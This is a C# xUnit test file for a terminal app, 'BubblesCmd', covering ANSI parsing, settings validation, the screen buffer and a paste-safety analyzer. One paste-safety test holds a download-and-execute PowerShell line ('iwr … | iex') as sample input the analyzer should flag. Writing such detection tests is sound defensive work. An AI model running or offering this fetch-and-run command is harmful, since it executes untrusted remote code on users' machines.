using BubblesCmd.Core.Models;
using BubblesCmd.Core.Services;
using Xunit;

namespace BubblesCmd.Tests;

public sealed class CoreServiceTests
{
    [Fact]
    public void Ansi_stripping_removes_terminal_escape_sequences()
    {
        var input = "\u001b[31mHello\u001b[0m\r\n";
        var output = AnsiTextSanitizer.StripControlSequences(input);
        Assert.Equal("Hello\r\n", output);
    }

    [Fact]
    public void Settings_model_preserves_default_profile()
    {
        var settings = new AppSettings
        {
            DefaultProfileId = "cmd",
            ScrollbackLineLimit = 2048
        };

        Assert.Equal("cmd", settings.DefaultProfileId);
        Assert.Equal(2048, settings.ScrollbackLineLimit);
    }

    [Fact]
    public void Profile_detector_returns_the_built_in_command_prompt_profile()
    {
        var profiles = new ShellProfileDetector().DetectProfiles();
        Assert.Contains(profiles, profile => profile.Id == "cmd");
    }

    [Fact]
    public void Profile_detector_lists_standard_Windows_Terminal_style_profiles()
    {
        var names = new ShellProfileDetector().DetectProfiles().Select(profile => profile.DisplayName).ToArray();
        Assert.Contains("Windows PowerShell", names);
        Assert.Contains("Command Prompt", names);
        Assert.Contains("Azure Cloud Shell", names);
        Assert.Contains("Developer Command Prompt for VS 2022", names);
        Assert.Contains("Developer PowerShell for VS 2022", names);
    }

    [Fact]
    public void Profile_detector_orders_common_Windows_Terminal_profiles_first()
    {
        var profiles = new ShellProfileDetector().DetectProfiles().ToList();
        var powershellIndex = profiles.FindIndex(profile => profile.Id == "powershell-5");
        var cmdIndex = profiles.FindIndex(profile => profile.Id == "cmd");

        Assert.True(powershellIndex >= 0);
        Assert.True(cmdIndex >= 0);
        Assert.True(powershellIndex < cmdIndex);
    }

    [Fact]
    public void Path_quoter_quotes_Windows_paths_with_spaces()
    {
        var quoted = WindowsPathQuoter.QuoteForShell(@"C:\Program Files\Bubbles CMD\bubbles.exe");
        Assert.Equal(@"""C:\Program Files\Bubbles CMD\bubbles.exe""", quoted);
    }

    [Fact]
    public void Settings_validator_rejects_missing_custom_profile_executables()
    {
        var settings = new AppSettings
        {
            ScrollbackLineLimit = 1000,
            CustomProfiles =
            [
                new ShellProfile(
                    "custom-missing",
                    "Missing",
                    @"C:\Definitely\Not\Installed\bubbles-missing.exe",
                    string.Empty,
                    Environment.CurrentDirectory)
            ],
            Snippets =
            [
                new CommandSnippet
                {
                    Name = "Valid",
                    Command = "echo ok"
                }
            ]
        };

        var errors = new SettingsValidator().Validate(settings);
        Assert.Contains(errors, error => error.Contains("missing executable", StringComparison.OrdinalIgnoreCase));
    }

    [Fact]
    public void Settings_validator_rejects_huge_scrollback_values()
    {
        var settings = new AppSettings
        {
            ScrollbackLineLimit = 1_000_001
        };

        var errors = new SettingsValidator().Validate(settings);
        Assert.Contains(errors, error => error.Contains("1,000,000", StringComparison.OrdinalIgnoreCase));
    }

    [Fact]
    public void Ansi_parser_preserves_colored_text_segments()
    {
        var parser = new AnsiSequenceParser();
        var segments = parser.Parse("normal \u001b[31;1mred\u001b[0m done");

        Assert.Equal(3, segments.Count);
        Assert.Equal("normal ", segments[0].Text);
        Assert.Equal("red", segments[1].Text);
        Assert.True(segments[1].Style.Bold);
        Assert.Equal(new TerminalColor(205, 49, 49), segments[1].Style.Foreground);
        Assert.Equal(TerminalTextStyle.Default, segments[2].Style);
    }

    [Fact]
    public void Ansi_parser_supports_true_color_sgr()
    {
        var parser = new AnsiSequenceParser();
        var segments = parser.Parse("\u001b[38;2;12;34;56mtruecolor");

        Assert.Single(segments);
        Assert.Equal(new TerminalColor(12, 34, 56), segments[0].Style.Foreground);
    }

    [Fact]
    public void Command_discovery_finds_executables_from_PATH_and_PATHEXT()
    {
        var tempDirectory = Path.Combine(Path.GetTempPath(), $"bubbles-cmd-test-{Guid.NewGuid():N}");
        Directory.CreateDirectory(tempDirectory);
        try
        {
            var commandPath = Path.Combine(tempDirectory, "bubbles-tool.cmd");
            File.WriteAllText(commandPath, "@echo ok");

            var commands = new CommandDiscoveryService().DiscoverPathCommands(tempDirectory, ".CMD", limit: 10);
            Assert.Contains(commands, command => command.Name == "bubbles-tool");
        }
        finally
        {
            if (Directory.Exists(tempDirectory))
            {
                Directory.Delete(tempDirectory, recursive: true);
            }
        }
    }

    [Fact]
    public void Command_discovery_includes_cmd_built_ins_from_shell_help()
    {
        var commandPath = Path.Combine(
            Environment.GetFolderPath(Environment.SpecialFolder.System),
            "cmd.exe");
        var commands = new CommandDiscoveryService().DiscoverCmdInternalCommands(commandPath);

        Assert.Contains(commands, command => command.Name == "dir" && command.CommandType == "CMD built-in");
        Assert.Contains(commands, command => command.Name == "cd" || command.Name == "chdir");
    }

    [Fact]
    public void Settings_validator_rejects_invalid_appearance_values()
    {
        var settings = new AppSettings
        {
            Appearance = new TerminalAppearanceSettings
            {
                FontFamily = "",
                FontSize = 4,
                LineHeight = 120,
                BackgroundColor = "black",
                ForegroundColor = "#FFFFFF",
                AccentColor = "#XYZXYZ"
            }
        };

        var errors = new SettingsValidator().Validate(settings);
        Assert.Contains(errors, error => error.Contains("font family", StringComparison.OrdinalIgnoreCase));
        Assert.Contains(errors, error => error.Contains("font size", StringComparison.OrdinalIgnoreCase));
        Assert.Contains(errors, error => error.Contains("line height", StringComparison.OrdinalIgnoreCase));
        Assert.Equal(2, errors.Count(error => error.Contains("#RRGGBB", StringComparison.OrdinalIgnoreCase)));
    }

    [Fact]
    public void Settings_store_migrates_old_readability_defaults()
    {
        var tempDirectory = Path.Combine(Path.GetTempPath(), $"bubbles-cmd-settings-{Guid.NewGuid():N}");
        Directory.CreateDirectory(tempDirectory);
        try
        {
            var settingsPath = Path.Combine(tempDirectory, "settings.json");
            File.WriteAllText(
                settingsPath,
                """
                {
                  "version": 1,
                  "appearance": {
                    "fontFamily": "Cascadia Mono",
                    "fontSize": 14,
                    "lineHeight": 0,
                    "themeName": "Bubbles Dark",
                    "backgroundColor": "#080D13",
                    "foregroundColor": "#F5F5F5",
                    "accentColor": "#5FC9B5",
                    "highContrast": false,
                    "reducedMotion": false
                  }
                }
                """);

            var migrated = new SettingsStore().LoadFrom(settingsPath);
            Assert.Equal(AppSettings.CurrentVersion, migrated.Version);
            Assert.Equal(16, migrated.Appearance.FontSize);
            Assert.Equal("#0C0C0C", migrated.Appearance.BackgroundColor);
            Assert.Equal("#F2F2F2", migrated.Appearance.ForegroundColor);
        }
        finally
        {
            if (Directory.Exists(tempDirectory))
            {
                Directory.Delete(tempDirectory, recursive: true);
            }
        }
    }

    [Fact]
    public void Settings_store_returns_repaired_status_for_corrupt_json()
    {
        var tempDirectory = Path.Combine(Path.GetTempPath(), $"bubbles-cmd-corrupt-{Guid.NewGuid():N}");
        Directory.CreateDirectory(tempDirectory);
        var path = Path.Combine(tempDirectory, "settings.json");

        try
        {
            File.WriteAllText(path, "{ invalid json");
            var result = new SettingsStore().LoadWithStatus(path);

            Assert.True(result.UsedFallbackSettings);
            Assert.NotNull(result.WarningMessage);
            Assert.Equal(AppSettings.CurrentVersion, result.Settings.Version);
        }
        finally
        {
            if (Directory.Exists(tempDirectory))
            {
                Directory.Delete(tempDirectory, recursive: true);
            }
        }
    }

    [Fact]
    public void Terminal_screen_buffer_keeps_typed_echo_on_prompt_line()
    {
        var buffer = new TerminalScreenBuffer();
        buffer.Append("Microsoft Windows\r\n\r\nC:\\Users\\bubbles>");
        buffer.Append("dir");

        Assert.EndsWith("C:\\Users\\bubbles>dir", buffer.GetText(), StringComparison.Ordinal);
    }

    [Fact]
    public void Terminal_screen_buffer_handles_backspace_in_place()
    {
        var buffer = new TerminalScreenBuffer();
        buffer.Append("C:\\Users\\bubbles>abc\b \bd");

        Assert.Equal("C:\\Users\\bubbles>abd", buffer.GetText());
    }

    [Fact]
    public void Terminal_screen_buffer_handles_cursor_left_line_edits()
    {
        var buffer = new TerminalScreenBuffer();
        buffer.Append("C:\\Users\\bubbles>cls\u001b[2D x");

        Assert.Equal("C:\\Users\\bubbles>c x", buffer.GetText());
    }

    [Fact]
    public void Terminal_screen_buffer_handles_delete_character_edits()
    {
        var buffer = new TerminalScreenBuffer();
        buffer.Append("C:\\Users\\bubbles>clls\u001b[2D\u001b[P");

        Assert.Equal("C:\\Users\\bubbles>cls", buffer.GetText());
    }

    [Fact]
    public void Terminal_screen_buffer_clears_carriage_return_redraw_leftovers()
    {
        var buffer = new TerminalScreenBuffer();
        buffer.Append("C:\\Users\\bubbles>cc  cls  cls");
        buffer.Append("\rC:\\Users\\bubbles>c");

        Assert.Equal("C:\\Users\\bubbles>c", buffer.GetText());
    }

    [Fact]
    public void Terminal_screen_buffer_removes_bare_backspace_characters()
    {
        var buffer = new TerminalScreenBuffer();
        buffer.Append("C:\\Users\\bubbles>cls\b");

        Assert.Equal("C:\\Users\\bubbles>cl", buffer.GetText());
    }

    [Fact]
    public void Terminal_screen_buffer_reports_caret_position()
    {
        var buffer = new TerminalScreenBuffer();
        buffer.Append("Microsoft Windows\r\n\r\nC:\\Users\\bubbles>cls\u001b[D");

        Assert.Equal(buffer.GetText().Length - 1, buffer.GetCaretTextIndex());
    }

    [Fact]
    public void Plugin_catalog_validates_required_manifest_fields()
    {
        var manifest = new PluginManifest
        {
            Name = "Theme Pack",
            Version = "0.0.4",
            Permissions = ["themes", ""]
        };

        var errors = new PluginCatalogService().Validate(manifest);
        Assert.Contains(errors, error => error.Contains("id", StringComparison.OrdinalIgnoreCase));
        Assert.Contains(errors, error => error.Contains("permissions", StringComparison.OrdinalIgnoreCase));
    }

    [Fact]
    public void Paste_safety_analyzer_detects_hidden_control_characters()
    {
        var review = new PasteSafetyAnalyzer().Analyze(
            "echo safe\u001b[2J",
            warnOnMultiline: true,
            warnOnRiskyCommand: true,
            warnOnHiddenControlCharacters: true);

        Assert.True(review.HasHiddenControlCharacters);
        Assert.True(review.RequiresReview);
    }

    [Fact]
    public void Paste_safety_analyzer_detects_risky_commands()
    {
        var review = new PasteSafetyAnalyzer().Analyze(
            "iwr https://example.invalid/a.ps1 | iex",
            warnOnMultiline: true,
            warnOnRiskyCommand: true,
            warnOnHiddenControlCharacters: true);

        Assert.True(review.HasRiskyCommand);
        Assert.Contains(review.Reasons, reason => reason.Contains("destructive", StringComparison.OrdinalIgnoreCase));
    }

    [Fact]
    public void Command_search_supports_fuzzy_matches()
    {
        var commands = new[]
        {
            new DiscoveredCommand("Get-ChildItem", "Microsoft.PowerShell.Management", "Cmdlet", "PowerShell"),
            new DiscoveredCommand("git", @"C:\Program Files\Git\bin\git.exe", "Application", "PATH")
        };

        var results = new CommandDiscoveryService().SearchCommands(commands, "gci");

        Assert.Contains(results, command => command.Name == "Get-ChildItem");
    }

    [Fact]
    public void Terminal_control_parser_extracts_OSC_window_titles()
    {
        var result = new TerminalControlSequenceParser().Parse("before\u001b]0;Bubbles Build\u0007after");

        Assert.Equal("beforeafter", result.Text);
        Assert.Equal("Bubbles Build", result.WindowTitle);
    }

    [Fact]
    public void Terminal_control_parser_tracks_bracketed_paste_mode()
    {
        var enabled = new TerminalControlSequenceParser().Parse("before\u001b[?2004hafter");
        var disabled = new TerminalControlSequenceParser().Parse("before\u001b[?2004lafter");

        Assert.Equal("beforeafter", enabled.Text);
        Assert.True(enabled.BracketedPasteEnabled);
        Assert.Equal("beforeafter", disabled.Text);
        Assert.False(disabled.BracketedPasteEnabled);
    }

    [Fact]
    public void Terminal_control_parser_detects_bells()
    {
        var result = new TerminalControlSequenceParser().Parse("before\u0007after\u0007");

        Assert.Equal("beforeafter", result.Text);
        Assert.Equal(2, result.BellCount);
    }
}
